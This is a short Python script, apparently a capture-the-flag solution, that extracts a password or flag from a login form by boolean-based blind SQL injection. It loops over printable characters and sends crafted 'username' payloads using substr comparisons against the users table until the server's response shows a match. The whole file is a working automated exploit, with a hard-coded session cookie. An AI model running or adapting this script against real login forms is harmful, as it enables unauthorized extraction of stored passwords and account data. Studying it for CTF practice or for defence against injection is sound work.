#!/usr/bin/env python3
import requests
import string

url = "http://screenctf.com:20045/"
headers = {"Cookie": "metabase.DEVICE=8defe2fc-c0e6-497d-b000-f5e4badb565c; _ga=GA1.2.508340289.1668850789"}

psw = "FLOG{"
i = len(psw) + 1
while True:
    for c in string.printable:
        data = {
            "username": f"' or (SELECT case substr(password,1,{i}) when '{psw+c}' then 1 else 0 end from users)--",
            "password": "a"
        }
        r = requests.post(url, headers=headers, data=data)
        if 'did it' in r.text:
            psw += c
            i += 1
            print(psw)
            break
        print(psw+c)
    
    if c == "}":
        break
print("FLAG:", psw)